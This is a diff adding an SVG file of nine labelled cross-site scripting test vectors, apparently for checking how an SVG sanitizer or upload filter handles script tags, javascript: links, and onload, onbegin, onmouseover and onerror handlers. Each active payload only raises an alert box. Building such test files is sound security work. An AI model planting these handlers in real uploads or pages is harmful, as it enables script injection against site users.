@@ -1,0 +1,41 @@
+<!-- test_payloads.svg -->
+<svg xmlns="http://www.w3.org/2000/svg" width="800" height="800">
+
+  <!-- 1. Basic Script Tag -->
+  <script>alert('script tag')</script>
+
+  <!-- 2. Onload on SVG -->
+  <svg xmlns="http://www.w3.org/2000/svg" onload="alert('onload on svg')"></svg>
+
+  <!-- 3. Xlink:href JavaScript -->
+  <a xlink:href="javascript:alert('xlink js')" xmlns:xlink="http://www.w3.org/1999/xlink">
+    <text x="10" y="40" fill="red">Click me (XLink)</text>
+  </a>
+
+  <!-- 4. Animate Tag -->
+  <animate attributeName="x" from="0" to="100" dur="1s" repeatCount="1"
+           onbegin="alert('animate triggered')"/>
+
+  <!-- 5. Set Tag -->
+  <set attributeName="x" to="200" begin="0s" dur="1s" onbegin="alert('set tag')"/>
+
+  <!-- 6. ForeignObject with HTML Injection (may get stripped) -->
+  <foreignObject x="10" y="60" width="300" height="100">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <h1 style="color:blue;">ForeignObject Test</h1>
+    </body>
+  </foreignObject>
+
+  <!-- 7. onmouseover on text -->
+  <text x="10" y="200" fill="blue" onmouseover="alert('mouseover!')">Hover me</text>
+
+  <!-- 8. onerror with image -->
+  <image href="invalid.png" onerror="alert('onerror triggered')" x="10" y="220" height="50" width="50"/>
+
+  <!-- 9. style tag with CDATA -->
+  <style><![CDATA[
+    text { fill: green; }
+  ]]></style>
+  <text x="10" y="300">Text styled via CSS</text>
+
+</svg>
